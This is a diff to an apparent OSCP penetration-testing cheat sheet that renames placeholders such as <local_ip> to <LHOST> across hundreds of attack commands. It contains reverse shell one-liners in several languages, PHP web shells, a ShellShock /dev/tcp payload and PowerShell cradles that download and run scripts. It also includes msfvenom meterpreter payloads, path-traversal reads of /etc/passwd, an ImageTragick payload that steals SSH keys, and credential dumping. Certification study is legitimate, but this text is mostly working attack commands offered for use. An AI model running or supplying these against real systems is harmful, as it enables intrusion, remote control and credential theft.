@@ -196,16 +196,16 @@ Commands, Payloads and Resources for the Offensive Security Certified Profession
 ### Basics
 #### CentOS
 ```c
-doas -u <user> /bin/sh
+doas -u <USERNAME> /bin/sh
 ```
 #### Certutil
 ```c
-certutil -urlcache -split -f "http://<local_ip>/<file>" <file>
+certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
 ```
 #### Chisel
 ```c
 ./chisel server -p 9002 -reverse -v
-./chisel client <remote_ip>:9002 R:9003:127.0.0.1:8888
+./chisel client <RHOST>:9002 R:9003:127.0.0.1:8888
 ```
 #### gcc
 ```c
@@ -215,8 +215,8 @@ x86_64-w64-mingw32-gcc -o main64.exe main.c
 ```
 #### Netcat
 ```c
-nc -lnvp <local_port> < <file>
-nc <remote_ip> <remote_port> > <file>
+nc -lnvp <LPORT> < <FILE>
+nc <RHOST> <RPORT> > <FILE>
 ```
 #### PHP Webserver
 ```c
@@ -224,8 +224,8 @@ sudo php -S 127.0.0.1:80
 ```
 #### Ping
 ```c
-ping -c 1 <remote_ip>
-ping -n 1 <remote_ip>
+ping -c 1 <RHOST>
+ping -n 1 <RHOST>
 ```
 #### Python Webserver
 ```c
@@ -234,20 +234,20 @@ sudo pyhton3 -m http.server 80
 ```
 #### RDP
 ```c
-xfreerdp /v:<remote_ip> /u:<user> /p:<password> +clipboard
-rdesktop <remote_ip>
+xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> +clipboard
+rdesktop <RHOST>
 ```
 #### SSH
 ```c
-ssh user@<remote_ip> -oKexAlgorithms=+diffie-hellman-group1-sha1
+ssh user@<RHOST> -oKexAlgorithms=+diffie-hellman-group1-sha1
 
-ssh -R 8080:<local_ip>:80 <remote_ip>
-ssh -L 8000:127.0.0.1:8000 <user>@<remote_ip>
-ssh -N -L 1234:127.0.0.1:1234 <user>@<remote_ip>
+ssh -R 8080:<LHOST>:80 <RHOST>
+ssh -L 8000:127.0.0.1:8000 <USERNAME>@<RHOST>
+ssh -N -L 1234:127.0.0.1:1234 <USERNAME>@<RHOST>
 
-ssh -L 80:<local_ip>:80 <remote_ip>
-ssh -L 127.0.0.1:80:<local_ip>:80 <remote_ip>
-ssh -L 80:localhost:80 <remote_ip>
+ssh -L 80:<LHOST>:80 <RHOST>
+ssh -L 127.0.0.1:80:<LHOST>:80 <RHOST>
+ssh -L 80:localhost:80 <RHOST>
 ```
 #### tmux
 ```c
@@ -291,64 +291,64 @@ export XTERM=xterm
 ```
 #### Windows Command Formatting
 ```c
-echo "<command>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
+echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
 ```
 
 ### Information Gathering
 #### Nmap
 ```c
-sudo nmap -A -T4 -p- -sS -sV -oN initial --script discovery <remote_ip>    # discovery scan
-sudo nmap -A -T4 -sC -sV --script vuln <remote_ip>    # vulnerability scan
-sudo nmap -sU <remote_ip>    # udp scan
-sudo nmap -sC -sV -p- --scan-delay 5s <remote_ip>    # delayed scan
-sudo nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <remote_ip>    # kerberos enumeration
+sudo nmap -A -T4 -p- -sS -sV -oN initial --script discovery <RHOST>    # discovery scan
+sudo nmap -A -T4 -sC -sV --script vuln <RHOST>    # vulnerability scan
+sudo nmap -sU <RHOST>    # udp scan
+sudo nmap -sC -sV -p- --scan-delay 5s <RHOST>    # delayed scan
+sudo nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <RHOST>    # kerberos enumeration
 ls -lh /usr/share/nmap/scripts/*ssh*
 locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
 ```
 #### DNS
 ##### Reverse DNS
 ```c
-whois <domain>
-host <remote_ip> <remote_ip>
-host -l <domain> <remote_ip>
-dig @<remote_ip> -x <domain>
-dig {a|txt|ns|mx} <domain>
-dig {a|txt|ns|mx} <domain> @ns1.<domain>
-dig axfr @<remote_ip> <domain>           # zone transfer - needs tcp DNS - port 53
+whois <TARGET_DOMAIN>
+host <RHOST> <RHOST>
+host -l <TARGET_DOMAIN> <RHOST>
+dig @<RHOST> -x <TARGET_DOMAIN>
+dig {a|txt|ns|mx} <TARGET_DOMAIN>
+dig {a|txt|ns|mx} <TARGET_DOMAIN> @ns1.<TARGET_DOMAIN>
+dig axfr @<RHOST> <TARGET_DOMAIN>    # zone transfer
 ```
 #### ldapsearch
 ```c
-ldapsearch -x -w <password>
-ldapsearch -x -h <remote_ip> -s base namingcontexts
-ldapsearch -x -b "dc=<target_domain>,dc=local" "*" -h <remote_ip> | awk '/dn: / {print $2}'
-ldapsearch -x -D "cn=admin,dc=<target_domain>,dc=local" -s sub "cn=*" -h <remote_ip> | awk '/uid: /{print $2}' | nl
+ldapsearch -x -w <PASSWORD>
+ldapsearch -x -h <RHOST> -s base namingcontexts
+ldapsearch -x -b "dc=<TARGET_DOMAIN>,dc=local" "*" -h <RHOST> | awk '/dn: / {print $2}'
+ldapsearch -x -D "cn=admin,dc=<TARGET_DOMAIN>,dc=local" -s sub "cn=*" -h <RHOST> | awk '/uid: /{print $2}' | nl
 ldapsearch -D "cn=admin,dc=acme,dc=com" "(objectClass=*)" -w ldapadmin -h ldap.acme.com
-ldapsearch -x -h <remote_ip> -D "<user>"  -b "dc=<target_domain>,dc=local" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
+ldapsearch -x -h <RHOST> -D "<USERNAME>"  -b "dc=<TARGET_DOMAIN>,dc=local" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
 ```
 #### sslyze
 ```c
-sslyze --heartbleed <remote_ip>
+sslyze --heartbleed <RHOST>
 ```
 #### SMB / NetBIOS
 ```c
-nbtscan <remote_ip>
-enum4linux -a <remote_ip>
+nbtscan <RHOST>
+enum4linux -a <RHOST>
 ```
 #### JAWS
 ```c
-IEX(New-Object Net.webclient).downloadString('http://<local_ip>:<local_port>/jaws-enum.ps1')
+IEX(New-Object Net.webclient).downloadString('http://<LHOST>:<LPORT>/jaws-enum.ps1')
 ```
 
 ### Vulnerability Analysis
 #### finger
 ```c
-./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t <remote_ip>
+./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t <RHOST>
 ```
 #### Nuclei
 ```c
-./nuclei -target https://<target_url> -t nuclei-templates    # basic syntax with path to templates
-./nuclei -target https://<target_url> -t nuclei-templates -rate-limit 5    # rate limiting
-./nuclei -target https://<target_url> -t nuclei-templates -header 'User-Agent: Pentesting -H 'X-OSCP-EXAM: oscp_exam'    # set headers
+./nuclei -target https://<TARGET_URL> -t nuclei-templates    # basic syntax with path to templates
+./nuclei -target https://<TARGET_URL> -t nuclei-templates -rate-limit 5    # rate limiting
+./nuclei -target https://<TARGET_URL> -t nuclei-templates -header 'User-Agent: OSCP-EXAM -H 'X-OSCP-EXAM: oscp_exam'    # set headers
 ```
 
 ### Web Application Analysis
@@ -358,41 +358,41 @@ curl -s -k "https://jldc.me/anubis/subdomains/example.com" | grep -Po "((http|ht
 ```
 #### ffuf
 ```c
-ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<target_url>/FUZZ -mc 200,204,301,302,307,401 -o results.txt
+ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<TARGET_URL>/FUZZ -mc 200,204,301,302,307,401 -o results.txt
 
-ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<target_url>/ -H "Host: FUZZ.<target url>" -fs 185
+ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<TARGET_URL>/ -H "Host: FUZZ.<TARGET_URL>" -fs 185
 
-ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u http://<target_url>/backups/backup_2020070416FUZZ.zip
+ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u http://<TARGET_URL>/backups/backup_2020070416FUZZ.zip
 
-ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<target_url>/admin../admin_staging/index.php?page=FUZZ -fs 15349
+ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<TARGET_URL>/admin../admin_staging/index.php?page=FUZZ -fs 15349
 ```
 #### Gobuster
 ```c
-gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<remote_ip>/
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/
 
-gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://<remote_ip> -x php
+gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://<RHOST> -x php
 
-gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://<remote_ip> -x php,txt,html,js -e -s 200
+gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://<RHOST> -x php,txt,html,js -e -s 200
 
-gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://<remote_ip>:<remote_port>/ -b 200 -k --wildcard
+gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://<RHOST>:<RPORT>/ -b 200 -k --wildcard
 
-gobuster dns -d <target_domain> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+gobuster dns -d <TARGET_DOMAIN> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 ```
 #### Hakrawler
 ```c
-hakrawler -url <remote_ip> -depth 3
-hakrawler -url <remote_ip> -depth 3 -plain
-hakrawler -url <remote_ip> -depth 3 -plain | httpx -http-proxy http://127.0.0.1:8080
+hakrawler -url <RHOST> -depth 3
+hakrawler -url <RHOST> -depth 3 -plain
+hakrawler -url <RHOST> -depth 3 -plain | httpx -http-proxy http://127.0.0.1:8080
 ```
 #### Local File Inclusion Vulnerability
 ```c
-http://<target_domain>/<file>.php?file=
-http://<target_domain>/<file>.php?file=../../../../../../../../etc/passwd
-http://<target_domain>/<file>/php?file=../../../../../../../../../../etc/passwd
+http://<TARGET_DOMAIN>/<FILE>.php?file=
+http://<TARGET_DOMAIN>/<FILE>.php?file=../../../../../../../../etc/passwd
+http://<TARGET_DOMAIN>/<FILE>/php?file=../../../../../../../../../../etc/passwd
 ```
 ##### Until php 5.3
 ```c
-http://<target_domain>/<file>/php?file=../../../../../../../../../../etc/passwd%00
+http://<TARGET_DOMAIN>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
 ```
 ##### Encoded Traversal Strings
 ```c
@@ -409,8 +409,8 @@ http://<target_domain>/<file>/php?file=../../../../../../../../../../etc/passwd%
 ```
 ##### Base64 Execution Bypass
 ```c
-http://<remote_ip>/index.php?page=php://filter/convert.base64-encode/resource=index
-base64 -d <file>.php
+http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=index
+base64 -d <FILE>.php
 ```
 ##### Linux Files
 ```c
@@ -752,26 +752,26 @@ C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
 ```
 #### wfuzz
 ```c
-wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://<remote_ip>:<remote_port>/FUZZ/<file>.php --hc '403,404'
+wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://<RHOST>:<RPORT>/FUZZ/<FILE>.php --hc '403,404'
 
-wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://<remote_ip:/<directory>/FUZZ.FUZ2Z -z list,txt-php --hc 403,404 -c
+wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>:/<DIRECTORY>/FUZZ.FUZ2Z -z list,txt-php --hc 403,404 -c
 
-wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.<target_url>" --hc 200 --hw 356 -t 100 <remote_ip>
+wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.<TARGET_URL>" --hc 200 --hw 356 -t 100 <RHOST>
 
-wfuzz -X POST -u "http://<remote_ip>:<remote_port>/login.php" -d "email=FUZZ&password=<password>" -w /path/to/wordlist.txt --hc 200 -c
+wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "email=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<wordlist>.txt --hc 200 -c
 
-wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d 'db=FUZZ' --hl 16 http://<remote_ip>/select
+wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d 'db=FUZZ' --hl 16 http://<RHOST>/select
 
-wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,403,404 -H "Host: FUZZ.<target_domain>" -u http://<target_domain> --hw <value> -t 100
+wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,403,404 -H "Host: FUZZ.<TARGET_DOMAIN>" -u http://<TARGET_DOMAIN> --hw <value> -t 100
 
 wfuzz -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt --hw 31 http://10.13.37.11/backups/backup_2021052315FUZZ.zip
 ```
 #### WPScan
 ```c
-wpscan --url https://<remote_ip> --disable-tls-checks
-wpscan --url https://<remote_ip> --disable-tls-checks --enumerate u
-target=<remote_ip>; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum
-wpscan --url http://<remote_ip> -U <user> -P passwords.txt -t 50
+wpscan --url https://<RHOST> --disable-tls-checks
+wpscan --url https://<RHOST> --disable-tls-checks --enumerate u
+target=<RHOST>; wpscan --url http://$target:80 --enumerate u,t,p | tee $target-wpscan-enum
+wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50
 ```
 
 ### Database Analysis
@@ -781,7 +781,7 @@ show databases;
 use <db>;
 show tables;
 SELECT * FROM *;
-mysql -u <user> -h <host> -p
+mysql -u <USERNAME> -h <host> -p
 ```
 #### SQLInjection
 ```c
@@ -826,20 +826,20 @@ or true--
 
 sqlmap --list-tampers
 
-sqlmap -r <file>.reg -p id
-sqlmap -r <file>.reg -p id --dump
-sqlmap -r <file>.reg --level 5 --risk 3 --threads 10
-sqlmap -r <file>.reg --level 5 --risk 3 --tables
-sqlmap -r <file>.reg --level 5 --risk 3 --tables users --dump --threads 10
-sqlmap -r <file>.reg -p id --passwords
-sqlmap -r <file>.reg -p id --read-file+/etc/passwd
-sqlmap -R <file>.reg -p id --os-cmd=whoami
-sqlmap -u 'http://<remote_ip>/dashboard.php?search=a' --cookie="PHPSESSID=c35v0sipg7q8cnpiqpeqj42hhq"
-sqlmap -u 'http://<remote_ip>/dashboard.php?search=a' --cookie="PHPSESSID=c35v0sipg7q8cnpiqpeqj42hhq" --os-shell
+sqlmap -r <FILE>.reg -p id
+sqlmap -r <FILE>.reg -p id --dump
+sqlmap -r <FILE>.reg --level 5 --risk 3 --threads 10
+sqlmap -r <FILE>.reg --level 5 --risk 3 --tables
+sqlmap -r <FILE>.reg --level 5 --risk 3 --tables users --dump --threads 10
+sqlmap -r <FILE>.reg -p id --passwords
+sqlmap -r <FILE>.reg -p id --read-file+/etc/passwd
+sqlmap -R <FILE>.reg -p id --os-cmd=whoami
+sqlmap -u 'http://<RHOST>/dashboard.php?search=a' --cookie="PHPSESSID=c35v0sipg7q8cnpiqpeqj42hhq"
+sqlmap -u 'http://<RHOST>/dashboard.php?search=a' --cookie="PHPSESSID=c35v0sipg7q8cnpiqpeqj42hhq" --os-shell
 ```
 #### sqsh
 ```c
-sqsh -S <remote_ip> -U <user>
+sqsh -S <RHOST> -U <USERNAME>
 ```
 #### SQL Truncation Attack
 ```c
@@ -856,7 +856,7 @@ test' or 1=2 or 'a'='a
 ### Password Attacks
 #### fcrack
 ```c
-fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <file>.zip
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip
 ```
 #### LaZagne
 ```c
@@ -867,23 +867,23 @@ laZagne.exe all
 export HYDRA_PROXY=connect://127.0.0.1:8080
 unset HYDRA_PROXY
 
-hydra <remote_ip> http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -l root@localhost -P otrs-cewl.txt -vV -f
+hydra <RHOST> http-form-post "/otrs/index.pl:Action=Login&RequestedURL=Action=Admin&User=root@localhost&Password=^PASS^:Login failed" -l root@localhost -P otrs-cewl.txt -vV -f
 
-hydra -l admin -P /usr/share/wordlists/rockyou.txt <remote_ip> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
+hydra -l admin -P /usr/share/wordlists/rockyou.txt <RHOST> http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=COOKIE_1&__EVENTVALIDATION=COOKIE_2&UserName=^USER^&Password=^PASS^&LoginButton=Log+in:Login failed"
 ```
 #### John
 ```c
 /usr/share/john/ssh2john.py id_rsa > hash
-john hash --wordlist=/usr/share/wordlists/rockyou.txt <file>
-john --rules --wordlist=/usr/share/wordlists/rockyou.txt <file>
-john --show <file>
+john hash --wordlist=/usr/share/wordlists/rockyou.txt <FILE>
+john --rules --wordlist=/usr/share/wordlists/rockyou.txt <FILE>
+john --show <FILE>
 ```
 
 ### Exploitation Tools
 #### ImageTragick Polyglot Attack
 ```c
 poc.svg
-<image authenticate='ff" `echo $(cat /home/<user>/.ssh/id_rsa)> /dev/shm/id_rsa`;"'>
+<image authenticate='ff" `echo $(cat /home/<USERNAME>/.ssh/id_rsa)> /dev/shm/id_rsa`;"'>
   <read filename="pdf:/etc/passwd"/>
   <get width="base-width" height="base-height" />
   <resize geometry="400x400" />
@@ -898,17 +898,17 @@ $ convert poc.svg poc.png
 #### Impacket
 ##### Basic Commands
 ```c
-psexec.py <user>@<remote_ip>
+psexec.py <USERNAME>@<RHOST>
 sudo impacket-smbserver local . -smb2support
-rpcdump.py <target_domain>/<user>:<password/hash>@<remote_ip>
-smbclient.py <target_domain>/<user>:<password/hash>@<remote_ip>
-lookupsid.py <target_domain>/<user>:<password/hash>@<remote_ip>
-reg.py <target_domain>/<user>:[password:password hash]@<remote_ip> <action> <action>
+rpcdump.py <TARGET_DOMAIN>/<USERNAME>:<PASSWORD/HASH>@<RHOST>
+smbclient.py <TARGET_DOMAIN>/<USERNAME>:<PASSWORD/HASH>@<RHOST>
+lookupsid.py <TARGET_DOMAIN>/<USERNAME>:<PASSWORD/HASH>@<RHOST>
+reg.py <TARGET_DOMAIN>/<USERNAME>:[<PASSWORD>:<PASSWORD/HASH>]@<RHOST> <ACTION> <ACTION>
 ```
 ##### Database Connections
 ```c
-mssqlclient.py <user>@<remote_ip>
-mssqlclient.py <user>@<remote_ip> -windows-auth
+mssqlclient.py <USERNAME>@<RHOST>
+mssqlclient.py <USERNAME>@<RHOST> -windows-auth
 ```
 ##### Forging Silver Ticket
 ```c
@@ -916,20 +916,20 @@ getST.py intelligence.htb/svc_int$  -spn WWW/dc.intelligence.htb -hashes :d64b83
 ```
 ##### ASPRepRoast
 ```c
-GetNPUsers.py <target_domain>.local/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+GetNPUsers.py <TARGET_DOMAIN>.local/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
 ```
 ##### PassTheHash
 ```c
-getTGT.py <domain>.local/<user> -dc-ip <domain>.local -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
+getTGT.py <TARGET_DOMAIN>.local/<USERNAME> -dc-ip <TARGET_DOMAIN>.local -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
 ```
 ##### SecretsDump
 ```c
-secretsdump.py <domain>/<user>@<remote_ip>
+secretsdump.py <TARGET_DOMAIN>/<USERNAME>@<RHOST>
 secretsdump.py -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
 ```
 #### ShellShock
 ```c
-curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/<local_ip>/<local_port> 0>&1' http://<remote_ip>/cgi-bin/user.sh
+curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' http://<RHOST>/cgi-bin/user.sh
 ```
 
 ### Post Exploitation
@@ -955,7 +955,7 @@ C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
 ```
 #### autologon
 ```c
-powershell -c "$SecPass = Convertto-securestring 'Welcome1!' -AsPlainText -Force;$cred=New-Object System.Management.Automation.PScredential('administrator', $SecPass);Start-Process -FilePath 'C:\Users\Public\Downloads\nc.exe' -argumentlist '-e cmd <local_ip> <local_port>' -Credential $cred"
+powershell -c "$SecPass = Convertto-securestring 'Welcome1!' -AsPlainText -Force;$cred=New-Object System.Management.Automation.PScredential('administrator', $SecPass);Start-Process -FilePath 'C:\Users\Public\Downloads\nc.exe' -argumentlist '-e cmd <LHOST> <LPORT>' -Credential $cred"
 ```
 #### Bash Privilege Escalation
 ```c
@@ -979,11 +979,11 @@ ls -R /home
 systeminfo
 whoami /all
 net users
-net users <user>
+net users <USERNAME>
 ```
 #### Evil-WinRM
 ```c
-sudo ruby /usr/local/bin/evil-winrm -i <remote_ip> -u <user> -p <password>
+sudo ruby /usr/local/bin/evil-winrm -i <RHOST> -u <USERNAME> -p <PASSWORD>
 ```
 #### find Commands
 ```c
@@ -991,10 +991,10 @@ find ./ -type f -exec grep --color=always -i -I 'password' {} \;
 
 find / -group <group> 2>/dev/null
 
-find / -user <user> 2>/dev/null
-find / -user <user> -ls 2>/dev/null
-find / -user <user> 2>/dev/null | grep -v proc 2>/dev/null
-find / -user <user> -ls 2>/dev/null | grep -v proc 2>/dev/null
+find / -user <USERNAME> 2>/dev/null
+find / -user <USERNAME> -ls 2>/dev/null
+find / -user <USERNAME> 2>/dev/null | grep -v proc 2>/dev/null
+find / -user <USERNAME> -ls 2>/dev/null | grep -v proc 2>/dev/null
 
 find / -perm -4000 2>/dev/null
 find / -perm -4000 2>/dev/null | xargs ls -la
@@ -1008,12 +1008,12 @@ grep -oiE "password.{20}" /etc/*.conf
 ```
 #### Juicy Potato
 ```c
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local_ip> LPORT=<local_port> -b "\x00\x0a" -a x86 --platform windows -f exe -o exploit.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b "\x00\x0a" -a x86 --platform windows -f exe -o exploit.exe
 
 msf6 > use exploit/multi/handler
 msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) > set LHOST <local_ip>
-msf6 exploit(multi/handler) > set LPORT <local_ip>
+msf6 exploit(multi/handler) > set LHOST <LHOST>
+msf6 exploit(multi/handler) > set LPORT <LHOST>
 msf6 exploit(multi/handler) > run
 
 .\exploit.exe
@@ -1026,17 +1026,17 @@ powershell -Command "$PSVersionTable.PSVersion"    # check powershell version
 
 powershell -c "[Environment]::Is64BitProcess"    # check for 64bit powershell
 
-cmd /c powershell -nop -exec bypass -c "iex(new-object net.webclient).downloadstring('http://<local_ip>:<local_port>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <local_ip> -Port <local_port>"
+cmd /c powershell -nop -exec bypass -c "iex(new-object net.webclient).downloadstring('http://<LHOST>:<LPORT>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>"
 
-powershell -c "(new-object System.Net.WebClient).DownloadFile(\"http://<local_ip>:<local_port>/nc.exe\",\"C:\Users\Public\Downloads\nc.exe\")"
+powershell -c "(new-object System.Net.WebClient).DownloadFile(\"http://<LHOST>:<LPORT>/nc.exe\",\"C:\Users\Public\Downloads\nc.exe\")"
 
-powershell (New-Object System.Net.WebClient).UploadFile('http://<local_ip>/upload.php', '<file>')
+powershell (New-Object System.Net.WebClient).UploadFile('http://<LHOST>/upload.php', '<FILE>')
 
-powershell -c "Invoke-Webrequest -Uri \"http://<local_ip>:<local_port>/shell.exe\" -OutFile \"C:\Users\Public\Downloads\shell.exe\""
+powershell -c "Invoke-Webrequest -Uri \"http://<LHOST>:<LPORT>/shell.exe\" -OutFile \"C:\Users\Public\Downloads\shell.exe\""
 
-<remote_ip>/node/3?cmd=powershell -c IEX(New-object System.net.webclient).DownloadString('http://<local_ip>:<local:port>/Sherlock.ps1');Find-AllVulns
+<RHOST>/node/3?cmd=powershell -c IEX(New-object System.net.webclient).DownloadString('http://<LHOST>:<local:port>/Sherlock.ps1');Find-AllVulns
 
-echo "IEX (New-object System.net.webclient).DownloadString('http://<local_ip>:<local_port>/shell.ps1')" | powershell -noprofile -
+echo "IEX (New-object System.net.webclient).DownloadString('http://<LHOST>:<LPORT>/shell.ps1')" | powershell -noprofile -
 ```
 #### Windows Tasks & Services
 ```c
@@ -1064,23 +1064,23 @@ wmic qfe get Caption,Description,HotFixID,InstalledOn    # no new patches - KEXP
 ### Payloads
 #### Reverse Shells
 ```c
-bash -i >& /dev/tcp/<local_ip>/<local_port> 0>&1
-bash -c 'bash -i >& /dev/tcp/<local_ip>/<local_port> 0>&1'
+bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
+bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
 
-http://<target_url>');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <local_ip> <local_port>/tmp/f")--    # lua
+http://<TARGET_URL>');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT>/tmp/f")--    # lua
 
-nc -e /bin/sh <local_ip> <local_port>
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <local_ip> <local_port> >/tmp/f
+nc -e /bin/sh <LHOST> <LPORT>
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f
 
-perl -e 'use Socket;$i="<local_ip>";$p=<local_port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
-php -r '$sock=fsockopen("<local_ip>",<local_port>);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
 
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<local_ip>",<local_port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<local_ip>",<local_port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
-ruby -rsocket -e'f=TCPSocket.open("<local_ip>",<local_port>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
 #### Web Shells
 ```c
@@ -1090,9 +1090,9 @@ ruby -rsocket -e'f=TCPSocket.open("<local_ip>",<local_port>).to_i;exec sprintf("
 <?php echo "test";?>
 <?php system($_GET['cmd']);?>
 
-<?php file_put_contents($_GET['upload'], file_get_contents("http://<local_ip>:<local_port>/" . $_GET['upload']); ?>
+<?php file_put_contents($_GET['upload'], file_get_contents("http://<LHOST>:<LPORT>/" . $_GET['upload']); ?>
 
-<?php if (isset($_GET['upload'])) {file_put_contents($_GET['upload'], file_get_contents("http://<local_ip>:<local_port>/" . $_GET['upload'])); }; if (isset($_GET['cmd'])) { system($_GET['cmd']); };?>
+<?php if (isset($_GET['upload'])) {file_put_contents($_GET['upload'], file_get_contents("http://<LHOST>:<LPORT>/" . $_GET['upload'])); }; if (isset($_GET['cmd'])) { system($_GET['cmd']); };?>
 ```
 #### nishang
 ```c
